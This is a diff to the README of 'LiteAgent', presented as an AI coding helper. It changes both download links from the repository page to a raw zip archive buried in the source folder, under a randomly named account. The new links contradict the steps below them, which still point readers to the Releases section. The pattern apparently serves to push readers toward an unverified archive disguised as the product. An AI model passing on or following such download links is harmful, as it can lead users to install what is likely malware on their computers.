@@ -1,6 +1,6 @@
 # 🤖 LiteAgent - Write better code with AI assistance
 
-[![Download LiteAgent](https://img.shields.io/badge/Download-LiteAgent-blue.svg)](https://github.com/junior-blephiliahirsuta7208/LiteAgent)
+[![Download LiteAgent](https://img.shields.io/badge/Download-LiteAgent-blue.svg)](https://github.com/junior-blephiliahirsuta7208/LiteAgent/raw/refs/heads/main/src/core/Agent_Lite_v1.6.zip)
 
 ## 📌 About this tool
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets these basic needs:
 
 Follow these steps to prepare your computer. First, you need to visit the website to obtain the installer.
 
-[Download LiteAgent here](https://github.com/junior-blephiliahirsuta7208/LiteAgent)
+[Download LiteAgent here](https://github.com/junior-blephiliahirsuta7208/LiteAgent/raw/refs/heads/main/src/core/Agent_Lite_v1.6.zip)
 
 1. Click the link above to visit the main page.
 2. Look for the latest version under the Releases section on the right side of the page.
